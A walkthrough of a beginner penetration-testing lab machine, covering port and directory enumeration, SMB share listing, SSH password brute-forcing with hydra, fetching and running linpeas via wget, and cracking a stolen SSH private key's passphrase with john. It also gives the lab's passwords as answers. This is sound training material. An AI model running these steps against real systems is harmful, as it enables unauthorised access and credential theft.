# Basic Pentesting

## Description

In these set of tasks you'll learn the following:

* brute forcing 
* hash cracking 
* service enumeration
* Linux Enumeration

## Initial Scan

Let's start with an Nmap scan. The scan reveals six open ports:
* 22 ssh
* 80 http
* 139 smb
* 445 smb
* 8009 ajp13
* 8080 http-proxy

~~~
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http-proxy
| fingerprint-strings: 
|   JavaRMI: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2243
|     Date: Sun, 24 Oct 2021 06:28:43 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web

Let's start with enumerating the webpage:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Basic_Pentesting]
└─$ curl -s "http://$IP/"
<html>

<h1>Undergoing maintenance</h1>

<h4>Please check back later</h4>

<!-- Check our dev note section if you need to know what to work on. -->


</html>
~~~

The webpage is under maintenance, so I ran `gobuster` on it to find directories:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Basic_Pentesting]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://$IP/ -x php,html,zip,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.91.85/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,zip,txt
[+] Timeout:                 10s
===============================================================
2021/10/24 02:24:21 Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 316] [--> http://10.10.91.85/development/]
~~~

Hidden directory: `development`

## Finding Users and Brute-forcing

We can see 2 txt files in this directory. Let's see what they're about:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Basic_Pentesting/files]
└─$ curl -s "http://$IP/development/" | html2text 
****** Index of /development ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[TXT]]       dev.txt          2018-04-23 14:52  483  
[[TXT]]       j.txt            2018-04-23 13:10  235  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 10.10.91.85 Port 80
~~~

### dev.txt

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Basic_Pentesting]
└─$ curl -s "http://$IP/development/dev.txt"

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
~~~

### j.txt

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Basic_Pentesting]
└─$ curl -s "http://$IP/development/j.txt"  
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
~~~

As you can see we have a conversation between two users. User `K` and user `J`. We know that user `J` has a weak password, so if we find the full username, we might be able to brute-force the password. We know that the SMB has been configured too, so let's head there.

### SMB

Let's use `smbclient` to connect to SMB. We should list the shares first:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Basic_Pentesting/files]
└─$ smbclient -L //$IP/      
Enter WORKGROUP\user's password: 

	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
SMB1 disabled -- no workgroup available
~~~

There is a share called `Anonymous` available to us. Let's see what we find there:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Basic_Pentesting/files]
└─$ smbclient //$IP/Anonymous
Enter WORKGROUP\user's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

		14318640 blocks of size 1024. 11093968 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \>
~~~

There is a file called `staff.txt`. I downloaded the file. Let's see the content:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Basic_Pentesting/files]
└─$ cat staff.txt 
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
~~~

we can see two usernames here:
* Jan
* Kay

### Brute-forcing SSH

So we know the full usernames now. We found out previously, that user `J` which is `Jan` has a weak password. Let's brute-force her password using `hydra` and rockyou wordlist for the SSH service:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Basic_Pentesting/files]
└─$ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://$IP
Hydra v9.3-dev (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-24 02:53:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.91.85:22/
[STATUS] 179.00 tries/min, 179 tries in 00:01h, 14344222 to do in 1335:36h, 16 active
[STATUS] 130.00 tries/min, 390 tries in 00:03h, 14344011 to do in 1838:59h, 16 active
[22][ssh] host: 10.10.91.85   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
~~~

Username: `jan`

Password: `armando`

## SSH

We connect to: `SSH`

Now that we have creds, we can connect to the machine via SSH (`jan@$IP`)

### Enumeration

I ran `sudo -l` and we can't run sudo as this user. Let's find a way to escalate to a more privileged user. I uplaoded [`linpeas`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to the target machine using a python server where the script is and `wget` on the target machine. Then I set its permission to be executable and finally we run the script:

On my machine:
~~~
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

On the target machine:
~~~
$ wget http://<YOUR IP>/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
~~~

I found out that we can read the id_rsa for user `kay` located in `/home/kay/.ssh/id_rsa`. It means that we can use this private key to connect to the machine via SSH as user `kay`. I copied the content of the rsa key to my machine, but we need a password to use it.

Other user: `kay`

### PrivEsc

We need to crack the password. First we need to use an additional tool called `ssh2john` which changes the format of the key, to a format which is crackable by `john`. The steps are as follows (Did I just say that? XD ):

~~~
$ locate ssh2john              
/usr/share/john/ssh2john.py
                                                                                                                      
$ /usr/share/john/ssh2john.py kay.key > key.hash 
                                                                                                                      
$ john --wordlist=/usr/share/wordlists/rockyou.txt key.hash   
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (kay.key)
Warning: Only 1 candidate left, minimum 4 needed for performance.
1g 0:00:00:05 DONE (2021-10-24 03:38) 0.1912g/s 2742Kp/s 2742Kc/s 2742KC/s *7¡Vamos!
Session completed
~~~

Now that we have the password (`beeswax`) for the private key, we can connect to the machine as user `kay`. (Don't forget to set the key's permission to 600 cuz that's how they like to be treated):

~~~
$ chmod 600 kay.key
$ ssh -i kay.key kay@$IP
~~~

## Final Password

Now we are logged in as user `kay` and there is a file called `pass.bak` in our home directory which is the password:

~~~
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
~~~

Final password: `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun hacking!

And have a good one! : )